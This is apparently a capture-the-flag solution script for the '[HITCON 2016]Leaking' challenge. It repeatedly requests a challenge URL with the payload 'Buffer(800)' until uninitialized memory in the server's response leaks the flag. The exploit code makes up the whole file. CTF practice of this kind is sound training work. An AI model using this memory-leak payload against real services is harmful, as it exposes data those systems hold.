#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2026/9/2 09:52
# @Author  : tushanfirm
# @File    : [HITCON 2016]Leaking.py
# @Software: PyCharm
import requests

url = 'http://7f137489c3caaa34fc7d7c88.http-ctf2.dasctf.com/'
payload = {'data': 'Buffer(800)'}
flag = ''
index = 1

while True:
    res = requests.get(url, payload)
    if 'hitcon' in res.text:
        print('执行次数: ' + str(index))
        flag = res.text
        break
    index += 1

print(flag)